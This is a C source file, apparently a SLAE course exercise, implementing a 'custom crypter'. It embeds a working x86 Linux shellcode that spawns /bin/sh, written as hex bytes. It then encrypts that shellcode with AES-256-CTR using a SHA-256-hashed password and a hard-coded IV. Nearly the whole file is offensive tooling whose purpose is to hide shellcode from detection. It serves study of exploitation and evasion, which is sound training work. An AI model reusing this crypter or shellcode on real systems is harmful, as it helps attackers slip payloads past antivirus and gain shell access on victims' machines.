/*
 Filename: Encrypt-AES-ctr-256.c
 Website:  http://securitytube.net
 Training: http://securitytube-training.com
 Desc: Custom Crypter using AES-CTR mode with 256bit encryption key 
 Author: konstantinos Alexiou
 SLAE-ID: SLAE-627
 Purpose: SLAE
 Compile :gcc Encrypt-AES-ctr-256.c -o EncryptAES -lcrypto
 */

# include <stdio.h>
# include <string.h>
# include <stdlib.h>
# include <openssl/evp.h>

main(int argc, char **argv)

{
        int K;
	/*
	   The Shellcode that is going to be ecrypted
	   http://shell-storm.org/shellcode/files/shellcode-230.php
	*/
        unsigned char shellcode[] =\
				  "\x6a\x30\x58\x6a\x05\x5b\xeb\x05\x59\xcd\x80\xcc\x40\xe8\xf6\xff\xff\xff"
        			  "\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
       				  "\x54\xeb\xe1";

        int shellcode_len;
	shellcode_len=strlen(shellcode);
        printf("\n---------------Shellcode------------------\n");
          for(K=0;K<shellcode_len;K++)
             {printf("\\x%02x", shellcode[K]);}
        printf("\n---------------Length=%d------------------\n",shellcode_len);


	/*
	   The password is passed as an argument
	*/
        unsigned char *key;
	int key_len;
	key = (unsigned char *)argv[1];
        key_len = strlen((unsigned char *)key);
        unsigned char pass[key_len+1];
	strcpy(pass, key);
	pass[key_len]='\n';

	/*
	   The password is hashed with sha256 to create 256bits Key length
	*/
       	EVP_MD_CTX *ctx_dig;
	OpenSSL_add_all_digests();
    	unsigned char digest[EVP_MAX_MD_SIZE];
        int digestLen;
	ctx_dig = EVP_MD_CTX_create();
	EVP_DigestInit_ex(ctx_dig, EVP_sha256(),NULL);
        EVP_DigestUpdate(ctx_dig, pass, strlen(pass));
    	EVP_DigestFinal_ex(ctx_dig, digest, &digestLen);
 	EVP_MD_CTX_destroy(ctx_dig);

	printf("\nSHA256 hash of Password [%s]------\n",key);
        for (K=0; K<digestLen; K++)
            {
             printf("%02x", digest[K]);
            }
        printf("\n------------------------------------------\n");
	EVP_cleanup();

       /*
               iv = Initialization Vector is a block of bits that is used by several modes to randomize
	       the encryption and hence to produce distinct ciphertexts even if the same plaintext
               is encrypted multiple times, without the need for a slower re-keying process
       */
        unsigned char iv[EVP_MAX_IV_LENGTH]="1234567887654321";

        printf("\n---------IV HEX-Format(16bytes)-----------\n");
         for(K=0;K<EVP_MAX_IV_LENGTH;K++)
         {
        printf("\\x%02x", iv[K]);
          }
	printf("\n------------------------------------------\n");
	unsigned char Cipher_shellcode[shellcode_len];
	int Cipher_len, i;
	EVP_CIPHER_CTX ctx_en;

	/*
	   EVP_EncryptInit_ex() initialises a cipher context ctx for encryption with cipher type.
	   type is normally supplied by a function such as EVP_des_cbc().
	   !!!We will implement AES in CTR mode of 256bits. CTR mode (CM) is also known as integer counter mode.
	   Counter mode turns a block cipher into a stream cipher.It generates the next keystream block by
	   encrypting successive values of a "counter".https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
	*/
	EVP_EncryptInit(&ctx_en, EVP_aes_256_ctr(), digest, iv);

        /*
	   void EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out,int *outl, unsigned char *in, int inl);
	   EVP_EncryptUpdate() encrypts inl bytes from the buffer in and writes the encrypted version to out.
	   This function can be called multiple times to encrypt successive blocks of data. The amount of data written
           depends on the block alignment of the encrypted data:
	   as a result the amount of data written may be anything from zero bytes to (inl + cipher_block_size - 1)
	   so out should contain sufficient room. The actual number of bytes written is placed in outl.
	   !!!Padding is not enabled on this mode so there is no need to call EVP_EncryptFinal
        */
        EVP_EncryptUpdate(&ctx_en, Cipher_shellcode, &Cipher_len, shellcode, shellcode_len);
	printf("\n------------Encrypted-Shellcode-----------\n");
	for(i=0;i<Cipher_len;i++)
		 {
		printf("\\x%02x", Cipher_shellcode[i]);
		  }
        printf("\n----------------Length=%d-----------------\n",sizeof(Cipher_shellcode));

	/*
	    EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it.
	    It should be called after all operations using a cipher are complete so sensitive information does not remain in memory.
        */
        EVP_CIPHER_CTX_cleanup(&ctx_en);
	CRYPTO_cleanup_all_ex_data();
	return 0;

}

